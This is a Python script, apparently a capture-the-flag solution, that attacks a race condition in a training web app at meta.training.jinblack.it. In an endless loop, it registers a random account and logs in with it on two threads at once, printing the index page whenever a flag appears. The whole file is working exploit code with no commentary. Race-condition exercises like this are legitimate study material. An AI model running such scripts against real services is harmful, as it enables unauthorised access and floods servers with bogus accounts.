import threading
import requests
import random
import string
import time

def randomString(stringLength):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

def login(session,username,password):
    url="http://meta.training.jinblack.it/login.php"
    data = {"username":username,"password":password,"log_user":""}
    r = session.post(url,data=data)
    richiesta_index = session.get("http://meta.training.jinblack.it/index.php")
    if "flag" in richiesta_index.text:
        print(richiesta_index.text)
    

def registration(session,username,password_1,password_2):
    url="http://meta.training.jinblack.it/register.php"
    data = {"username":username,"password_1":password_1,"password_2":password_2,"reg_user":""}
    r = session.post(url,data=data)

while(True):
    session = requests.Session()
    username = randomString(10)
    password = randomString(10)
    t1=threading.Thread(target=registration, args=(session,username,password,password))
    t2=threading.Thread(target=login, args=(session,username,password))
    t1.start()
    t2.start()

    t1.join()
    t2.join()